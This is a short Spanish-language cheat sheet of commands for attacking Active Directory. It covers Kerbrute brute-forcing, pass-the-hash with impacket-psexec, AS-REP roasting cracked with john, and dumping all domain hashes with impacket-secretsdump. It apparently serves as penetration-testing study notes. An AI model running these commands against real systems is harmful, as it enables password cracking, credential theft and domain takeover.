
### Enumerar usuarios Active Directory
#### Kerbrute - kerberos
Kerbrute es una herramienta que realiza ataques de fuerza bruta contra kerberos para enumerar:
* Parejas de usuario/contraseña válidas
* Usuarios válidos
* Usuarios sin pre-autenticación requerida 


```python
python3 kerbrute.py -users users.txt -passwords pass.txt -domain dominio.local -t 100
```
El parámetro **-t 100** : sirve para indicar los hilos

### Acceso al dominio con un hash (ataque pass the hash)

Poemos intentar acceder al dominio sin necesidad de crackear la contraseña, solamente teniendo el hash, haciendo un **pass the hash**

#### Ataque pass the hash con impacket

```bash
impacket-psexec usuario@ip -hashes <hash en cadena de texto>
```

Ejemplo:

```bash
impacket-psexec Administrator@10.10.10.4 -hashes aaeeff31234aaaadddsfee345:2345:addfbbe
```


### Validar credenciales de dominio

```bash
crackmapexec smb <ip> -u <usuario> -p <contraseña>
```

### Obtener hash contraseña usuario dominio
Cuando detectamos usuarios en un dominio que tienen el NOT-PREAUTH, podemos intentar obtener el hash de su contraseña para luego crackearla con john the ripper.

```bash
impacket-GetNPUsers <dominio>/<usuario> -no-pass
```
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Obtener hashes vulnerables 

si tenemos una pareja de credenciales (user/pass), podemos intentar obtener todos los hashes de los usuarios del dominio, incluido el del administrador.
```bash
impacket-secretsdump -just-dc usuario@ip
```

posteriormente nos pide la contraseña de ese usuario, y lo ejecutamos. Nos obtiene los hashes de todos los usuarios del dominio.
